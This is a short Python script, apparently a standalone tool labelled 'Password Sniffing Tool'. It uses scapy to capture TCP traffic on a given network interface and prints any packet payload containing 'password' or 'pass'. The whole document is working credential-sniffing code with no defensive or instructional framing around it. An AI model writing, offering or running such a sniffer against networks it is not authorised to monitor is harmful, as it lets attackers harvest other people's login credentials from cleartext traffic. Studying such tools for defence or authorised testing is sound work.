from scapy.all import *
import argparse
import re

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load
        if b'password' in payload.lower() or b'pass' in payload.lower():
            print(f"[+] Possible password found: {payload.decode('utf-8', errors='ignore')}")

def password_sniffing(interface):
    sniff(iface=interface, prn=packet_callback, store=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Password Sniffing Tool")
    parser.add_argument("interface", help="Network interface to listen on")
    args = parser.parse_args()

    password_sniffing(args.interface)